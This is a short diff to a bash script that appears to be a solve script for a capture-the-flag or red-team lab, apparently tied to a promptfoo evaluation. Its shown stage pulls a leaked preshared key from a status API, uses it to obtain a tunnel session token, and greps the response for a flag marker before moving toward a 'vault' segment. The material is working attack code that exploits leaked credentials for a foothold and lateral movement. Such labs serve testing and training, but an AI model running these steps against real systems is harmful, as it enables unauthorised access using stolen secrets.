@@ -10,8 +10,9 @@ echo "[*] stage 1 — edge foothold (leaked PSK -> tunnel session) ->"
 psk="$(curl -s "$BASE/api/status" \
   | python3 -c 'import sys,json; print(json.load(sys.stdin)["config"]["preshared_key"])')"
 echo "    preshared_key=$psk"
-session="$(curl -s -G "$BASE/api/connect" --data-urlencode "psk=$psk" \
-  | python3 -c 'import sys,json; print(json.load(sys.stdin)["session_token"])')"
+conn="$(curl -s -G "$BASE/api/connect" --data-urlencode "psk=$psk")"
+printf '%s\n' "$conn" | grep -oE 'PROMPTFOO\{[^}]*\}' | head -n1 || true   # s6a_edge stage marker (per-hop verify §6.3)
+session="$(printf '%s' "$conn" | python3 -c 'import sys,json; print(json.load(sys.stdin)["session_token"])')"
 echo "    session_token=$session"
 
 echo "[*] stage 2 — second segment (tunnel through the gateway to vault) ->"
